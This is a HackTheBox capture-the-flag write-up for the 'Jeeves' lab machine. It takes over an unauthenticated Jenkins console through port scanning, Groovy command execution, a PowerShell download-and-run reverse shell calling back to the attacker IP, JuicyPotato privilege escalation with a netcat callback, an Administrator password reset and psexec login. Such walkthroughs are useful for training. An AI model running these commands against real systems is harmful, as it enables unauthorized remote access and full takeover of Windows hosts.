# Jeeves | HackTheBox

### 1. Scan
```bash
┌──(kali㉿kali)-[10.10.14.36]-[~/Desktop]
└─$ sudo nmap -A -p- -T4 10.129.148.24                         
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-20 05:01 EDT
Nmap scan report for 10.129.148.24
Host is up (0.29s latency).
Not shown: 65531 filtered ports
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Ask Jeeves
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Error 404 Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2008|10 (90%), FreeBSD 6.X (85%)
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_10 cpe:/o:freebsd:freebsd:6.2
Aggressive OS guesses: Microsoft Windows Server 2008 R2 (90%), Microsoft Windows 10 1511 - 1607 (85%), FreeBSD 6.2-RELEASE (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 4h59m57s, deviation: 0s, median: 4h59m57s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-05-20T14:10:17
|_  start_date: 2021-05-20T14:00:31

TRACEROUTE (using port 445/tcp)
HOP RTT       ADDRESS
1   311.60 ms 10.10.14.1
2   303.87 ms 10.129.148.24

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 595.45 seconds
```
The machine is running two web servers on port 80 and 50000, and appears to be Windows 10.

### 2. Enumeration
Did some dirbusting first up on all the web servers and got a few interesting results. Among them is a /askjeeves directory on port 50000. Going to it, there is a Jenkins instance which does not require any authentication. Jenkins as an automation server has management capabilities for running scripts, providing an instant way to get command execution. The version is 2.87.
  
To test script command execution, I navigate to the Script Console in the management panel and enter the following code using the Groovy scripting language. Then click "Run".
```groovy
String result = """ cmd.exe /c whoami """
println result.execute().text
```
The result is printed below the console as "jeeves\kohsuke".  
Below is some more enumeration, as I was originally thinking about dropping a meterpreter payload to fix my (below) shell issues, didnt end up doing it.
```shell
Host Name:                 JEEVES
OS Name:                   Microsoft Windows 10 Pro
OS Version:                10.0.10586 N/A Build 10586
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00331-20304-47406-AA297
Original Install Date:     10/25/2017, 4:45:33 PM
System Boot Time:          5/20/2021, 10:00:23 AM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.13989454.B64.1906190538, 6/19/2019
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-05:00) Eastern Time (US & Canada)
Total Physical Memory:     2,047 MB
Available Physical Memory: 1,097 MB
Virtual Memory: Max Size:  2,687 MB
Virtual Memory: Available: 1,708 MB
Virtual Memory: In Use:    979 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 10 Hotfix(s) Installed.
                           [01]: KB3150513
                           [02]: KB3161102
                           [03]: KB3172729
                           [04]: KB3173428
                           [05]: KB4021702
                           [06]: KB4022633
                           [07]: KB4033631
                           [08]: KB4035632
                           [09]: KB4051613
                           [10]: KB4041689
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet 2
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.129.0.1
                                 IP address(es)
                                 [01]: 10.129.148.24
                                 [02]: fe80::fc96:3192:b7af:5af3
                                 [03]: dead:beef::d198:1281:c2bd:de7d
                                 [04]: dead:beef::fc96:3192:b7af:5af3
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```

### 3. Get a shell
Host a powershell reverse shell script, then run a command to retrieve and execute it.
```groovy
String result = """ powershell.exe "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.36/shell.ps1')" """
println result.execute().text
```
Capture the shell in the listener.
```shell
┌──(kali㉿kali)-[10.10.14.36]-[~/Desktop]
└─$ sudo nc -lvnp 443

listening on [any] 443 ...
connect to [10.10.14.36] from (UNKNOWN) [10.129.148.24] 49682

PS C:\Users\Administrator\.jenkins> whoami
jeeves\kohsuke
```

### 4. Enumeration
The shell does not persist for longer than a few minutes, so I just keep rerunning the script continually. Not sure why it kept dying - tried a bunch of different methods with no real success so just persevered.  
Some basic enumeration of privs and groups...
```shell
USER INFORMATION
----------------

User Name      SID                                        
============== ===========================================
jeeves\kohsuke S-1-5-21-2851396806-8246019-2289784878-1001


GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes                                        
==================================== ================ ============ ==================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                   


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled
```
The SeImpersonatePrivilage means it is possible to elevate to system privileges through COM server abuse.

### 5. Elevate to SYSTEM
Copy the exploit and nc to the machine.
```
PS C:\Users\Administrator\.jenkins> Invoke-WebRequest -Uri http://10.10.14.36/nc64.exe -Outfile nc.exe
PS C:\Users\Administrator\.jenkins> Invoke-WebRequest -Uri http://10.10.14.36/JuicyPotato64.exe -Outfile jp.exe
```
Execute the exploit, providing arguments telling it to connect back on port 9999.
```shell
PS C:\Users\Administrator\.jenkins> .\jp.exe -l 1337 -p C:\windows\system32\cmd.exe -a "/c C:\Users\Administrator\.jenkins\nc.exe -e cmd.exe 10.10.14.36 9999" -t *
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
```
Catch the system shell.
```shell
┌──(kali㉿kali)-[10.10.14.36]-[~/Desktop]
└─$ sudo nc -lvnp 9999                
listening on [any] 9999 ...
connect to [10.10.14.36] from (UNKNOWN) [10.129.148.24] 49703
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

### 6. Get persistance
So after all that, the shell still dies after a few mins. To overcome this, change the admin account password.
```shell
C:\Windows\system32>net user Administrator jib1337JIB1337!
The command completed successfully.
```
Then do psexec to get a shell on the machine.
```shell
┌──(kali㉿kali)-[10.10.14.36]-[~/Desktop]
└─$ impacket-psexec Administrator@10.129.148.24                                                           1 ⨯
Impacket v0.9.23.dev1+20210315.121412.a16198c3 - Copyright 2020 SecureAuth Corporation

Password:
[*] Requesting shares on 10.129.148.24.....
[*] Found writable share ADMIN$
[*] Uploading file ODPFVYeo.exe
[*] Opening SVCManager on 10.129.148.24.....
[*] Creating service PXae on 10.129.148.24.....
[*] Starting service PXae.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami && hostname
nt authority\system
Jeeves

C:\Windows\system32>
```
